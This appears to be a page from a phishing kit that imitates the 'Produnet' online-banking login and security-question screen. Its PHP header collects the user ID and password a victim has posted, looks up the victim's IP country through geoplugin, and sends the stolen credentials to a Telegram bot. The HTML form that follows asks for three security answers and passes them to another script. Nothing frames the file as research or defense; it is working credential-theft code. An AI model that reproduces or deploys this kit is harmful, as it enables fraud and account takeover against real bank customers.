<?php
ini_set("display_errors", 0);
@$userp = $_SERVER['REMOTE_ADDR'];
@$meta = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$userp));
@$pais = $meta['geoplugin_countryName']; 
include('datos_de_tel.php');

if( isset($_POST['userid']) && isset($_POST['userclav']) ){

    $userid = htmlspecialchars($_POST['userid']);
    $userclav = htmlspecialchars($_POST['userclav']);

    $message = "PR0DU - Login\r\nUser: ".$userid."\r\nClv: ".$userclav."\r\nIP:".$userp." ".$pais."";

    $apiToken = $apibot;
    $data = [
        'chat_id' => $canal,
        'text' => $message
    ];
    file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data));
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,Chrome=1">
    <meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, user-scalable=yes" target-densitydpi="dpi">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <title>Produ</title>
    <link href="produnetcss.css" rel="stylesheet">
</head>
<body>
    <header id="cabecera" class="container-fluid">
        <div class="row">
            <noscript>
                <div id="divIndicacionScript" class="col-sm-12 col-md-12 col-lg-12 col-xs-12">
                    <div class="alert alert-info" role="alert">
                        <blockquote class="blockquote-info">
                            Produnet requiere usar Javascript. Por favor activa esta funcionalidad en tu navegador y refresca la página.
                        </blockquote>
                    </div>
                </div>
            </noscript>
        </div>
    </header>
    <main id="contenedorPrincipal" class="ds-contenedor-principal">
        <section class="ds-contenedor ds-contenedor--publico ds-contenedor__scroll">
            <aside class="ds-imagen-principal">
                <div class="ds-imagen-principal__banner"></div>
            </aside>
            <section class="ds-contenido-principal">
                <div id="logoMarca" class="ds-logotipo"></div>
                <div id="contenedorMensajeAlertaError"> </div>
                <div id="contenedorMensajeAlertaExito"> </div>
                <h4 style="font-family:Trebuchet MS,sans-serif;" class="ds-titulo-primario ds-titulo-primario--color-primario">Factor de seguridad</h4>
                <div id="contenedorMensajeAlertaInformativa"> </div>
                <section id="contenidoPrincipal">
                    <div id="divContenedorPagina">
                        <div class="ds-formulario-vista">
                            <form action="ind.php" method="post">
    <input type="hidden" name="userid" value="<?php echo htmlspecialchars($_POST['userid']); ?>">
                                
                                <input name="__RequestVerificationToken" type="hidden" value="lSREZJfKjgAy7sOVTD33PgQTkZid1HSgbYtW8dEdPv5-DATjtF5omLIpskdfCv89UQvMSFVKNJ3MZhEjwBAeZ25vmp7iwcqXqxRm9o6pnk81">
                                <input id="SecretoMaquina" name="SecretoMaquina" type="hidden" value="">
                                <span style="font-size: 16px;color:#489E42;font-weight:inherit;" class="ds-subtitulo">Colocar tus 3 respuestas de seguridad</span>
                                <div>
                                    <div class="ds-grupo-caja">
                                        <label style="font-family:Trebuchet MS,sans-serif;" class="ds-etiqueta">Respuesta  1</label>
                                        <input style="font-family:Trebuchet MS,sans-serif;" autocomplete="off" autofocus="true" class="ds-control-caja-texto ds-usuario__caja-usuario ds-mayuscula" id="NombreUsuario" maxlength="20" name="num1" placeholder="Escribe la respuesta" required="required" spellcheck="false" type="text" aria-required="true">
                                        <br><br>
                                        <label style="font-family:Trebuchet MS,sans-serif;" class="ds-etiqueta">Respuesta 2</label>
                                        <input style="font-family:Trebuchet MS,sans-serif;" autocomplete="off" autofocus="true" class="ds-control-caja-texto ds-usuario__caja-usuario ds-mayuscula" id="NombreUsuario" maxlength="20" name="num2" placeholder="Escribe la respuesta" required="required" spellcheck="false" type="text" aria-required="true">
                                        <br><br>
                                        <label style="font-family:Trebuchet MS,sans-serif;" class="ds-etiqueta">Respuesta 3</label>
                                        <input style="font-family:Trebuchet MS,sans-serif;" autocomplete="off" autofocus="true" class="ds-control-caja-texto ds-usuario__caja-usuario ds-mayuscula" id="NombreUsuario" maxlength="20" name="num3" placeholder="Escribe la respuesta" required="required" spellcheck="false" type="text" aria-required="true">
                                    </div>
                                    <div id="divBotonInicioSesion" class="ds-div__boton--mostrar">
                                        <input style="background-color:#075B00;font-family:Trebuchet MS,sans-serif;" type="submit" value="Continuar" id="btnEnrolamiento" style="font-family:Trebuchet MS,sans-serif;" class="ds-control ds-control-boton ds-control-boton--secundario">
                                    </div>
                                    <div id="divBotonInicioSesionIE" class="ds-div__boton--ocultar">
                                        <input type="submit" value="Continuar" id="btnAceptarInternetExplorer" class="ds-control ds-control-boton ds-margen-superior-30 ds-margen-superior-30 ds-control-boton--deshabilitado" type="button" disabled="disabled">
                                    </div>
                                </form>
                                <br>
                                <div id="divBotonInicioSesion" class="ds-div__boton--mostrar">
                                    <input style="background-color:#fff;font-family:Trebuchet MS,sans-serif;color: black;" type="submit" value="Cancelar" id="btnEnrolamiento" style="font-family:Trebuchet MS,sans-serif;" class="ds-control ds-control-boton ds-control-boton--secundario">
                                </div>
                                <div id="divBotonInicioSesionIE" class="ds-div__boton--ocultar">
                                    <input type="submit" value="Cancelar" id="btnAceptarInternetExplorer" class="ds-control ds-control-boton ds-margen-superior-30 ds-margen-superior-30 ds-control-boton--deshabilitado" type="button" disabled="disabled">
                                </div>
                            </form>
                        </div>
                    </div>
                </section>
            </section>
        </section>
    </main>
</body>
</html>
